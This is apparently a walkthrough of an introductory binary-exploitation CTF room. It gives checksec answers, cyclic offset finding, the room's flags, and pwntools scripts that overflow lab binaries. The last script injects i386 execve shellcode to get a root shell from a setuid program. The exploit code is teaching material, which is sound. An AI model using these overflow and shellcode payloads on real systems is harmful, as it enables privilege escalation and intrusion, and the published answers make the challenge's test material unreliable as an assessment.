# Intro To Pwntools

### Checksec
- Does Intro2pwn1 have FULL RELRO (Y or N)? `Y`
- Does Intro2pwn1 have RWX segments (Y or N)? `N`
- Does Intro2pwn2 have a stack canary (Y or N)? `N`
- Does Intro2pwn2 not have PIE (Y or N)? `Y`
- Cause a buffer overflow on intro2pwn1 by inputting a long string such as AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA. What was detected? <br />
![image](https://github.com/user-attachments/assets/1a3ae39b-f459-4a96-bab9-1866c5dbb7ce)<br />
`Stack Smashing`
- Now cause a buffer overflow on intro2pwn2. What error do you get? `Segmentation Fault`

### Cyclic
- Which user owns both the flag.txt and intro2pwn3 file? `dizmas`
- Use checksec on intro2pwn3. What bird-themed protection is missing?<br />
![image](https://github.com/user-attachments/assets/e51887cd-d3de-4d3f-850c-3bcd458335e3)<br />
`canary`
- What ascii letter sequence is 0x4a4a4a4a (pwndbg should tell you).<br />
![image](https://github.com/user-attachments/assets/1f309b36-63e9-4b18-b022-966b54cce71b)<br />
`JJJJ`
- What is the output of "cyclic 12"? `aaaabaaacaaa`
- What pattern, in hex, was the eip overflowed with? `0x6161616a`
- What is the flag?<br />
Execute the following code:

      from pwn import *
      padding = cyclic(cyclic_find('jaaa'))
      eip = p32(0x8048536)
      payload = padding + eip
      print(payload)

Note that this will work on the target machine, but sometimes in other machines python will print the payload as `b'...'`. So it will print ascii characters, not real bytes(it has something to do with how `print` works). If you want to create your payload in the attack box, my suggestion is to add the following lines to the above code

      with open('output.bin', 'wb') as f:
            f.write(payload)
This code will create a .bin file with the correct hexadecimal values. Then you can trasnfer it on the target machine with netcat or python http server. <br />
Another problem: if you try to inject the code on gdb it will say "permission denied":<br />
![image](https://github.com/user-attachments/assets/02a4ad9a-134a-44e1-93cf-81856651dc54)<br />
That's because probably on gdb you're not really executing the suid binary, but you're executing gdb, which doesn't have elevated privileges. So to exploit it we actually need to run the binary from the command line.<br />
![image](https://github.com/user-attachments/assets/697aa091-ff52-4e39-b952-d8602df59478)<br />
`flag{13@rning_2_pwn!}`

### Networking
- What port is serving our challenge? `1337`
- Please use checksec on serve_test. Is there a stack canary? (Y or N)<br />
![image](https://github.com/user-attachments/assets/80378c93-6059-473a-89aa-6c3484f3984a)<br />
`Y`
- What is the flag?<br />
I execute the following payload from my attack box:

      from pwn import *
      connect = remote('target_IP', 1337)
      print(connect.recvn(18))
      payload = "A"*32
      payload += p32(0xdeadbeef)
      connect.send(payload)
      print(connect.recvn(34))
Replace `target_IP` with the correct IP.<br />
![image](https://github.com/user-attachments/assets/69319af8-14de-4a3b-89ac-c01d01ce0185)<br />
`flag{n3tw0rk!ng_!$_fun}`

### Shellcraft
- What does ASLR stand for? `address space layout randomization`
- Who owns intro2pwnFinal? `root`
- Use checksec on intro2pwn final. Is NX enabled? (Y or N) `N`
- Please use the cyclic tool and gdb to find the eip. What letter sequence fills the eip?<br />
First of all, run `/home/buzz/IntroToPwntools/IntroToPwntools/shellcraft/disable_aslr.sh` to disable aslr. <br />
Next, run `cyclic 100 > pattern.txt`, and run the binary on gdb with `run < pattern.txt`:<br />
![image](https://github.com/user-attachments/assets/78818a38-5aa0-49e1-8d55-34ee92d1dd68)<br />
`taaa`
- Run your exploit with the breakpoint outside of gdb (./intro2pwnFinal < output_file). What does it say when you hit the breakpoint? `Trace/breakpoint trap`
- Run the command "shellcraft i386.linux.sh -f a", which will print our shellcode in assembly format. The first line will tell you that it is running a function from the Unix standard library, with the parameters of "(path='/bin///sh', argv=['sh'], envp=0)." What function is it using? `execve`
- Run whoami once you have the shell. Who are you? `root`
- What is the flag?<br />
Just use the following python script to spawn a root shell:

      from pwn import *
      proc = process('./intro2pwnFinal')
      proc.recvline()
      padding = cyclic(cyclic_find('taaa'))
      eip = p32(0xffffd510+200)
      nop_slide = "\x90"*1000
      shellcode = "jhh\x2f\x2f\x2fsh\x2fbin\x89\xe3jph\x01\x01\x01\x01\x814\x24ri\x01,1\xc9Qj\x07Y\x01\xe1Qj\x08Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80"
      payload = padding + eip + nop_slide + shellcode
      proc.send(payload)
      proc.interactive()
`flag{pwn!ng_!$_fr33d0m}`
